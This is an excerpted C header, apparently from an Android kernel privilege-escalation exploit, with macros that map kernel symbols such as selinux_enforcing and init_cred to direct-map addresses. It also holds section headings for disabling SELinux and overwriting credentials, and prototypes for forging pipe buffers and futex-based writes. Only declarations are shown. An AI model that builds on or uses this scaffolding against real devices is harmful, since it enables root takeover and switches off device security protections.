...
/* --- build mode --- */
#define UNPLUS_VERSION "1.5"

/* --- mm / slab ordering (must come before ORDER3_SIZE) --- */
...
/* data_addr: P0 (direct-map) alias */
#define data_addr(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
...
/* TARGET P0 aliases — derived from target.h (KPM verified).
 * Kept here (not in target.h) because they depend on data_addr() below.
 * PCPU_BASE_ADDR / PCPU_UNIT_SIZE moved to target.h (TARGET_PCPU_*). */
#define TARGET_DATA_SELINUX     data_addr(SELINUX_ENFORCING)
#define TARGET_DATA_INIT_CRED   data_addr(INIT_CRED)
#define TARGET_DATA_INIT_TASK   data_addr(INIT_TASK)
#define TARGET_DATA_ASHMEM_FOPS data_addr(ASHMEM_MISC_FOPS)
...
/* --- shared state (ghostlock PI write + common) --- */
...
/* --- shared state (CyberMeowfia pipe physrw + root) --- */
...
/* --- direct read result (direct_write.c) --- */
...
/* --- stage1 (SELinux off + cred overwrite) --- */
...
int direct_read_shape0_exact64_once(
    uintptr_t q, uint64_t *value, const char *name, int attempt, int *write_idx);
...
void reset_slide_futex_state(void);
...
void forge_pipe_buffers_on_page(int fd, uintptr_t base,
    uintptr_t direct_addr, size_t len, int for_write);
